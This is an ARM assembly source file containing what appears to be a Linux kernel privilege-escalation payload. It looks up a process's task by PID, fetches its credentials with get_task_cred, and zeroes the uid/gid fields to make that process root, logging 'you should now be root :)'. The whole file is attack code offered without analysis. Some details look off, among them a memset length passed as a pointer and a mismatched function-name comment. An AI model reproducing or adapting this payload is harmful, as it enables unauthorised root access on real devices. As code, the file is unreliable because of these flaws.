.text
.global _start
_start:
  // prologue
  mov     ip, sp
  push    {r3, r4, fp, ip, lr, pc}
  sub     fp, ip, #8

  cmp r0, #2
  bne default

  ldr r0, [r1, #4]
  bl StrToInt
  b ok

default:
  mov r0, #1

ok:
  push {r0}
  mov r1, r0
  ldr r0, pChkPid
  bl printk

  // kallsyms_lookup_name("find_task_by_pid")
  ldr     r0, pFindTaskByPid
  bl      kallsyms_lookup_name
  push {r0}

  // printk
  mov     r1, r0
  ldr r0, pFTResult
  bl printk

  // get task
  pop {r3}
  pop {r0}
  blx r3
  push {r0}

  // printk
  mov r1, r0
  ldr     r0, pTaskEq
  bl printk

  // kallsyms_lookup_name("get_task_cred")
  ldr     r0, pGetTaskCred
  bl      kallsyms_lookup_name
  push {r0}

  // printk
  mov r1, r0
  ldr     r0, pGTResult
  bl printk

  // get cred
  pop {r3}
  pop {r0}
  blx r3
  push {r0}

  // printk
  mov r1, r0
  ldr     r0, pYay
  bl printk

  // memset(cred+4, 0, cred+4+32)
  pop {r0}
  add r0, r0, #4
  mov r1, #0
  add r2, r0, #32
  bl memset

  // printk
  ldr r0, [pc]
  bl printk

  // epilogue
  mov r0, #0
  ldm     sp, {r3, r4, fp, sp, pc}

.word 0

pChkPid: .word szChkPid
szChkPid:
	.ascii "\n<3>"
	.include "buildts.S" // "Built at $(date)"
	.asciz ", checking pid=%d\n"

pFindTaskByPid: .word szFindTaskByPid
szFindTaskByPid: .asciz "find_task_by_vpid"

pFTResult: .word szFTResult
szFTResult: .asciz "<3>find_task_by_vpid = 0x%p\n"

pTaskEq: .word szTaskEq
szTaskEq: .asciz "<3>task = 0x%p\n"

pGetTaskCred: .word szGetTaskCred
szGetTaskCred: .asciz "get_task_cred"

pGTResult: .word szGTResult
szGTResult: .asciz "<3>get_task_cred = 0x%p\n"

pCResult: .word szCResult
szCResult: .asciz "<3>cred = 0x%p\n"

pYay: .word szYay
szYay: .asciz "<3>you should now be root :)\n"
